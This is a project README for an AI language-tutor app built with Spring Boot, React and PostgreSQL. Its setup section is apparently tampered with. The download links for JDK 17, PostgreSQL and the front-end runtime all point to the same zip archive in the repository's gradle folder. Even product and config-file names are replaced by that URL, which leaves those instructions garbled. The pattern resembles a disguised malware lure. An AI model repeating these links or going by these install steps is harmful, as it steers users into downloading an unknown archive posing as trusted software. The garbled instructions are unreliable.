# Overview

This project is an AI-powered language tutor application designed to enhance the student learning experience by providing a personalised learning environment. The application divides users into students and teachers, allowing them to interact in a structured educational environment. 

Teachers can create lessons, set assessments, and mentor students, while students can select and learn from available lessons and practice language skills by interacting with AI. The AI interactions are powered by the OpenAI GPT API, creating a conversational learning experience that adapts to the context provided by the teacher.

The application consists of a backend and a frontend:
- The **backend**, built using Java and the Spring Boot framework, is responsible for the core business logic and interacts with the database to persist user, course, and assessment data.
- The **frontend**, developed using the React framework, provides an intuitive and interactive interface for students and teachers to interact with the system.

### Key Features
- **User Management**: Handles registration and management of student and teacher accounts.
- **Course Creation**: Allows teachers to create courses, set assessments, and manage content.
- **Course Selection**: Enables students to browse and select courses.
- **AI-based Student Learning**: Provides a conversational learning experience using OpenAI GPT API.
- **Payment System**: Manages course registration fees, balance top-up, and teacher withdrawals.
- **Integration of Components**: Combines backend and frontend to offer a seamless digital learning platform for educational interactions.

# Configuration

To run the project, you need to install the following software:

1. **JDK 17**: For compiling and running the back-end part.
   - Java download link: [https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip](https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip)
   - Make sure that you have installed JDK 17 and set the `JAVA_HOME` environment variable.
   - **Set the environment variable**:
     - Variable name: `JAVA_HOME`
     - Variable value: Enter the path where the JDK is installed, e.g., `C:\Program Files\Java\jdk-17`

2. **PostgreSQL**: Used to store user, course, and assessment data.
   - PostgreSQL download link: [https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip](https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip)
   - Install PostgreSQL and create a database for your project.
   - Configure the database username and password so that the backend can connect properly.

3. **https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip**: Used to run the front-end part.
   - https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip download link: [https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip](https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip)
   - Install https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip (LTS version is recommended).
   - Make sure you have `npm` or `yarn` installed to manage front-end dependencies.

### Installation of Dependency Packages Required by the Front-End

Use the following commands to install the necessary front-end dependencies:

```bash
npm install bootstrap
npm install react-router-dom
npm install axios
npm install react-bootstrap bootstrap
```

# Deployment Instructions

To deploy the project, follow the steps below:

## Backend Section Deployment

1. Go to the root directory of the backend project.
2. Build the project using Gradle in IntelliJ IDEA.
   - You can run the main method directly to start the service.
   - Ensure that the PostgreSQL database is started and that the application is able to connect to the database correctly.

## Front-End Section Deployment

1. Go to the root directory of the front-end project.
2. Install the required dependencies for the frontend:
   
 ```bash
npm install
npm start
 ```

## Environment Variables

1. The backend needs to be configured with database connection information (username, password), which can be set in the https://raw.githubusercontent.com/DanteEtnad/AI_tutor/master/front-end/tutor/gradle/AI_tutor_v3.0-beta.5.zip file.
2. The key for the OpenAI API needs to be configured to support AI interaction features.

# Advanced Technologies

The following high-level technologies are used in this project:

### OpenAI GPT API
- Use OpenAI's GPT API to implement a dialogue function between students and the AI to provide a personalized language learning experience.
- Teachers can set up course scenarios, and the AI will interact with students based on these scenarios.

### Spring Boot
- The backend uses the Spring Boot framework, which simplifies the configuration and development process and provides powerful dependency injection and modularity.
- Uses Spring Data JPA to handle database operations, reducing a lot of boilerplate code.

### React
- The front-end uses the React framework to provide users with a modern, responsive user interface.
- Utilizes React Router to implement the application's page navigation.

### RESTful API
- The back-end communicates with the front-end via a RESTful API, ensuring front-end and back-end separation.
- This approach improves the scalability and maintainability of the application.

### PostgreSQL
- PostgreSQL is used as a relational database management system.
- It is responsible for storing information about users, courses, test records, etc., ensuring data security and consistency.

### React Bootstrap
- Uses React Bootstrap to enhance the aesthetics and user experience of the front-end interface.
- Simplifies the use of UI components.

### Gradle
- Uses Gradle as the project build tool to facilitate dependency management and project packaging.
